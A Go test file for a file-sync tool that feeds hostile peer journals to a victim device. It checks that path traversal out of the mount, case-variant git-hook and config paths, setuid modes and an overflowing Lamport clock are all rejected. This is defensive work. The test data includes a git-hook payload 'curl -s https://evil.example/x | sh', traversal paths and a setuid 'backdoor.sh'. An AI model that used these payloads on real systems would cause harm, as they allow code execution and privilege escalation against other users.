package syncer

import (
	"context"
	"encoding/json"
	"io/fs"
	"math"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/runbear-io/beardrive/internal/config"
	"github.com/runbear-io/beardrive/internal/journal"
	"github.com/runbear-io/beardrive/internal/remote"
)

// Scoreboard row 11, the device half. A journal is arbitrary JSONL that any
// member with write permission can PUT to the hub, and every peer folds it
// into journal.Replay and materializes the result onto its own disk. Round 2
// audited exactly one field of an op — Blob — and closed it at the hub's read
// side. These tests attack the rest of the record where it does damage: on the
// receiving device.
//
// Every test follows TestSec_Sync_PeerJournalCannotMaterializeReservedPaths:
// build a victim device over a shared file:// remote, drop a hostile journal
// (and its blobs) into that remote by hand — no peer Session, because a real
// Session would never author these ops — and drive an explicit cycle().
//
// Helpers are prefixed secjrn* so they cannot collide with another agent's
// file in this package.

// secjrnBlob stores content in the shared remote and returns its sha256, so a
// hostile op has real content behind it and pull cannot skip it.
func secjrnBlob(t *testing.T, be remote.Backend, content string) string {
	t.Helper()
	sum := sha256hex(content)
	if err := be.Put(context.Background(), "blobs/"+sum, strings.NewReader(content), int64(len(content))); err != nil {
		t.Fatal(err)
	}
	return sum
}

// secjrnPush writes ops to the remote as device dev's journal — the exact
// bytes a `PUT /store/object?key=journal/<dev>.jsonl` lands in storage.
func secjrnPush(t *testing.T, be remote.Backend, dev string, ops []journal.Op) {
	t.Helper()
	data, err := journal.Marshal(ops)
	if err != nil {
		t.Fatal(err)
	}
	if err := be.Put(context.Background(), "journal/"+dev+".jsonl", strings.NewReader(string(data)), int64(len(data))); err != nil {
		t.Fatal(err)
	}
}

// secjrnOp is a put op from a peer device, with every field a real device
// would set. Callers override the one they are attacking.
func secjrnOp(seq int64, p, blob string, size int) journal.Op {
	return journal.Op{
		Seq: seq, Lamport: seq, Time: time.Now().UTC(),
		Device: "attacker", DeviceName: "attacker", Author: "attacker@test",
		Kind: journal.KindPut, Path: p, Blob: blob, Size: int64(size), Mode: 0o644,
	}
}

// secjrnProject writes a plausible .bdrive/config.json into a mount, so the
// folder looks like a real enrolled project rather than a bare temp dir.
func secjrnProject(t *testing.T, folder string) string {
	t.Helper()
	dir := filepath.Join(folder, config.ProjectDir)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	body, err := json.Marshal(config.Project{ID: "m-victim01", Volume: "victim", Remote: "https://hub.example/p/victim"})
	if err != nil {
		t.Fatal(err)
	}
	p := filepath.Join(dir, "config.json")
	if err := os.WriteFile(p, body, 0o644); err != nil {
		t.Fatal(err)
	}
	return p
}

// ---- Op.Path: the mount boundary ----

// materialize resolves an op's Path with filepath.Join(s.Folder, ...) and
// guards it with filter.Skip + neverSync. neverSync splits the path on "/" and
// looks each segment up in ReservedDirs; ".." is not a reserved directory and
// the ignore rules do not mention it either, so a path that walks up out of
// the mount passes both checks and Join happily resolves it above the root.
//
// A peer therefore writes ANY file the victim's user account can write —
// ~/.ssh/authorized_keys, ~/.claude/settings.json, a sibling project — by
// pushing one line of JSON to a project it shares with them.
func TestSec_SyncJournal_PeerCannotMaterializeOutsideTheMount(t *testing.T) {
	be := sharedRemote(t)
	victim := newDevice(t, "victim", be)
	outside := filepath.Dir(victim.Folder) // one level above the mount root

	const content = "owned by a peer journal"
	blob := secjrnBlob(t, be, content)
	escapes := []string{
		"../pwned.txt",
		"../../pwned-two-up.txt",
		"docs/../../pwned-via-subdir.txt",
	}
	ops := make([]journal.Op, 0, len(escapes)+1)
	for i, p := range escapes {
		ops = append(ops, secjrnOp(int64(i+1), p, blob, len(content)))
	}
	// Control: an ordinary op in the same journal. If this one does not land,
	// the pull never happened and the rest proves nothing.
	ops = append(ops, secjrnOp(int64(len(escapes)+1), "notes/ok.md", blob, len(content)))
	secjrnPush(t, be, "attacker", ops)

	cycle(t, victim)

	if got := read(t, victim.Folder, "notes/ok.md"); got != content {
		t.Fatalf("control op did not materialize: %q", got)
	}
	for _, name := range []string{"pwned.txt", "pwned-via-subdir.txt"} {
		abs := filepath.Join(outside, name)
		if _, err := os.Stat(abs); err == nil {
			t.Errorf("a peer journal wrote %s — outside the mount root %s", abs, victim.Folder)
		}
	}
	if _, err := os.Stat(filepath.Join(filepath.Dir(outside), "pwned-two-up.txt")); err == nil {
		t.Errorf("a peer journal wrote two levels above the mount root %s", victim.Folder)
	}
	// Belt and braces: whatever the escape resolved to, nothing may exist
	// under the mount at a cleaned path that started with "..".
	for _, p := range escapes {
		if _, err := os.Stat(filepath.Join(victim.Folder, filepath.FromSlash(p))); err == nil {
			t.Errorf("path %q materialized (resolves to %s)", p, filepath.Join(victim.Folder, filepath.FromSlash(p)))
		}
	}
}

// The reserved-directory guard (config.ReservedDirs, applied by neverSync) is
// an exact string match, but BearDrive's primary platform stores paths
// case-insensitively (APFS and NTFS both default to it). A peer op named
// ".GIT/hooks/pre-commit" clears the guard, and then the filesystem resolves
// it into the mount's REAL .git/hooks — an executable that runs on the
// victim's next commit. That is exactly the outcome ReservedDirs exists to
// prevent, and TestSec_Sync_PeerJournalCannotMaterializeReservedPaths only
// blocks it in lowercase.
//
// ".BDRIVE/config.json" is the same bypass aimed at the mount's identity; it
// survives here only by luck, because materializeFile refuses to clobber an
// untracked file that is already on disk. Delete the config and the same op
// creates it. Both are asserted: the concrete damage, and the rule.
func TestSec_SyncJournal_ReservedDirGuardIsCaseInsensitive(t *testing.T) {
	be := sharedRemote(t)
	victim := newDevice(t, "victim", be)
	cfg := secjrnProject(t, victim.Folder)
	before, err := os.ReadFile(cfg)
	if err != nil {
		t.Fatal(err)
	}
	// A mount that is also a git checkout — the common case, and what
	// ReservedDirs[".git"] is there for.
	hooks := filepath.Join(victim.Folder, ".git", "hooks")
	if err := os.MkdirAll(hooks, 0o755); err != nil {
		t.Fatal(err)
	}

	const content = "#!/bin/sh\ncurl -s https://evil.example/x | sh\n"
	blob := secjrnBlob(t, be, content)
	hostile := []string{
		".GIT/hooks/pre-commit",
		".BDRIVE/config.json",
		".Bdrive/config.json",
		"docs/.BDrive/config.json",
	}
	ops := make([]journal.Op, 0, len(hostile)+1)
	for i, p := range hostile {
		ops = append(ops, secjrnOp(int64(i+1), p, blob, len(content)))
	}
	ops = append(ops, secjrnOp(int64(len(hostile)+1), "notes/ok.md", blob, len(content)))
	secjrnPush(t, be, "attacker", ops)

	cycle(t, victim)

	if got := read(t, victim.Folder, "notes/ok.md"); got != content {
		t.Fatalf("control op did not materialize: %q", got)
	}
	// The damage, on a case-insensitive filesystem: an executable git hook.
	if _, err := os.Stat(filepath.Join(hooks, "pre-commit")); err == nil {
		t.Errorf("a peer journal planted %s — it runs on the victim's next commit", filepath.Join(hooks, "pre-commit"))
	}
	// The same bypass aimed at the mount's own identity.
	if after, err := os.ReadFile(cfg); err == nil && string(after) != string(before) {
		t.Errorf("a peer journal rewrote the mount's %s: %s", cfg, after)
	}
	// The rule, on every filesystem: a reserved directory is reserved
	// whatever its case, so none of these may be written at all.
	if bad := secjrnReservedHits(t, victim.Folder); len(bad) > 0 {
		t.Errorf("materialized under case-variant reserved directories: %v", bad)
	}
}

// secjrnReservedHits walks a mount and returns every file sitting under a
// directory whose name case-folds onto a reserved one.
func secjrnReservedHits(t *testing.T, folder string) []string {
	t.Helper()
	var bad []string
	filepath.WalkDir(folder, func(p string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		rel, rerr := filepath.Rel(folder, p)
		if rerr != nil {
			return nil
		}
		for _, seg := range strings.Split(filepath.ToSlash(rel), "/") {
			for reserved := range config.ReservedDirs {
				if strings.EqualFold(seg, reserved) && seg != reserved {
					bad = append(bad, filepath.ToSlash(rel))
					return nil
				}
			}
		}
		return nil
	})
	return bad
}

// ---- Op.Mode: what materialize chmods ----

// scan only ever records info.Mode().Perm() — the nine permission bits — but
// Op.Mode is a raw uint32 off the wire and writeFile hands it to os.Chmod as
// an fs.FileMode. fs.ModeSetuid/ModeSetgid are bits in that same word, and
// os.Chmod translates them into S_ISUID/S_ISGID. A peer therefore drops a
// setuid-root-equivalent binary — setuid to the VICTIM's uid — into every
// teammate's synced folder, which is local privilege escalation to that user
// on any shared machine.
func TestSec_SyncJournal_PeerCannotSetSetuidOrSetgidMode(t *testing.T) {
	be := sharedRemote(t)
	victim := newDevice(t, "victim", be)

	const content = "#!/bin/sh\nid\n"
	blob := secjrnBlob(t, be, content)
	setuid := secjrnOp(1, "bin/backdoor.sh", blob, len(content))
	setuid.Mode = uint32(fs.ModeSetuid | fs.ModeSetgid | 0o755)
	world := secjrnOp(2, "bin/world.sh", blob, len(content))
	world.Mode = 0o777
	secjrnPush(t, be, "attacker", []journal.Op{setuid, world})

	cycle(t, victim)

	fi, err := os.Stat(filepath.Join(victim.Folder, "bin", "backdoor.sh"))
	if err != nil {
		t.Fatalf("control: the op did not materialize at all: %v", err)
	}
	if fi.Mode()&(fs.ModeSetuid|fs.ModeSetgid) != 0 {
		t.Errorf("a peer journal set %v on bin/backdoor.sh — setuid/setgid must never survive materialize", fi.Mode())
	}
	if fi, err := os.Stat(filepath.Join(victim.Folder, "bin", "world.sh")); err == nil {
		if fi.Mode().Perm()&0o022 != 0 {
			t.Errorf("a peer journal made bin/world.sh group/world-writable (%v)", fi.Mode().Perm())
		}
	}
}

// ---- Op.Lamport: the total order ----

// Cycle raises this device's lamport clock to any value it pulls
// (st.Lamport = op.Lamport) and scan then increments it for each local op. One
// op carrying math.MaxInt64 wraps the victim's clock negative on its very next
// edit, so every op it ever writes again sorts BEFORE every op it has already
// seen. journal.Less is unchanged and deterministic — it is the INPUT that is
// unchecked — and the effect is that the victim can no longer change a shared
// file: its own edit is journaled, then immediately reverted on its own disk
// by the replay, with no conflict copy (nothing new was pulled that cycle) and
// no error. A permanent, silent write lock, installed by one line of JSON.
func TestSec_SyncJournal_ExtremeLamportCannotFreezeADevice(t *testing.T) {
	be := sharedRemote(t)
	victim := newDevice(t, "victim", be)

	theirs := secjrnBlob(t, be, "attacker version")
	poison := secjrnBlob(t, be, "poison")
	shared := secjrnOp(1, "shared.md", theirs, len("attacker version"))
	shared.Lamport = 1
	bomb := secjrnOp(2, "unrelated.md", poison, len("poison"))
	bomb.Lamport = math.MaxInt64
	secjrnPush(t, be, "attacker", []journal.Op{shared, bomb})

	cycle(t, victim)
	if got := read(t, victim.Folder, "shared.md"); got != "attacker version" {
		t.Fatalf("control: peer op did not materialize: %q", got)
	}

	// The victim now edits the shared file, exactly as a user would.
	write(t, victim.Folder, "shared.md", "victim version")
	res := cycle(t, victim)
	if res.LocalOps == 0 {
		t.Fatal("control: the local edit was not journaled at all")
	}
	if got := read(t, victim.Folder, "shared.md"); got != "victim version" {
		t.Errorf("the victim's own later edit was reverted on its own disk: %q — a peer's lamport value overflowed this device's clock", got)
	}
	if res.Conflicts != 0 {
		t.Logf("(conflict copies made: %d)", res.Conflicts)
	}
}

// ---- fields that are already inert: assert they stay that way ----

// Device, Kind and Size are the remaining unvalidated fields. On the device
// side none of them reaches a filename or a filesystem call: the journal file
// is named from the remote KEY, conflict copies sanitize DeviceName, and
// materialize writes blob bytes rather than Size bytes. This test pins that,
// so a future refactor that starts trusting one of them fails here.
func TestSec_SyncJournal_HostileDeviceKindAndSizeStayInert(t *testing.T) {
	be := sharedRemote(t)
	victim := newDevice(t, "victim", be)

	const content = "real content"
	blob := secjrnBlob(t, be, content)

	traversalDevice := secjrnOp(1, "a.md", blob, len(content))
	traversalDevice.Device = "../../../etc/passwd"
	traversalDevice.DeviceName = "../../evil"

	unknownKind := secjrnOp(2, "b.md", blob, len(content))
	unknownKind.Kind = "truncate"
	emptyKind := secjrnOp(3, "c.md", blob, len(content))
	emptyKind.Kind = ""

	lyingSize := secjrnOp(4, "d.md", blob, len(content))
	lyingSize.Size = 1 << 40

	secjrnPush(t, be, "attacker", []journal.Op{traversalDevice, unknownKind, emptyKind, lyingSize})
	cycle(t, victim)

	// A hostile Device id must not have escaped the volume store's journal dir.
	if _, err := os.Stat(filepath.Join(filepath.Dir(victim.Folder), "passwd")); err == nil {
		t.Error("an op's Device field reached a path outside the volume store")
	}
	// An unknown or empty Kind must be inert, not a silent put.
	for _, rel := range []string{"b.md", "c.md"} {
		if _, err := os.Stat(filepath.Join(victim.Folder, rel)); err == nil {
			t.Errorf("an op with a non-put/delete Kind materialized %s", rel)
		}
	}
	// A lying Size must not decide how many bytes land on disk.
	if got := read(t, victim.Folder, "d.md"); got != content {
		t.Errorf("Size drove the write: got %q", got)
	}
	if got := read(t, victim.Folder, "a.md"); got != content {
		t.Errorf("control op with a hostile Device did not materialize: %q", got)
	}
}
